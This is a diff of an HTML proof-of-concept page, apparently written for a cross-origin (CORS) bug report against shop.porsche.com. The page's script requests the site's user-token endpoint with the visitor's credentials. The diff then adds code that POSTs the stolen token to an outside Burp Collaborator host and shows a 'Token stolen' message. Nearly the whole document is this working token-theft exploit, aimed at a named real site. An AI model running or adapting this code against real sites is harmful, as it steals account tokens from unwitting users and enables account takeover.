@@ -1,19 +1,42 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Malicious Site</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious Page</title>
 </head>
 <body>
+    <h1>Loading...</h1>
     <script>
+        // Step 1: Make the cross-origin request to the vulnerable endpoint
         fetch('https://shop.porsche.com/api/user-token', {
             credentials: 'include'
         })
         .then(response => response.json())
         .then(data => {
-            console.log('User Token:', data.userToken);
-            // Attacker can now use the token or send it to their server
+            // Step 2: Extract the user token from the response
+            const userToken = data.userToken;
+            
+            // Step 3: Send the stolen token to the attacker's server
+            fetch('https://637ogudz96xr8934wuk9qidlgcm2ar.burpcollaborator.net/collect', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ token: userToken })
+            })
+            .then(() => {
+                document.body.innerHTML = '<h1>Token stolen and sent to attacker!</h1>';
+            })
+            .catch(error => {
+                console.error('Error sending token to attacker:', error);
+                document.body.innerHTML = '<h1>Error occurred!</h1>';
+            });
         })
-        .catch(error => console.error('Error:', error));
+        .catch(error => {
+            console.error('Error fetching user token:', error);
+            document.body.innerHTML = '<h1>Error fetching user token!</h1>';
+        });
     </script>
 </body>
 </html>
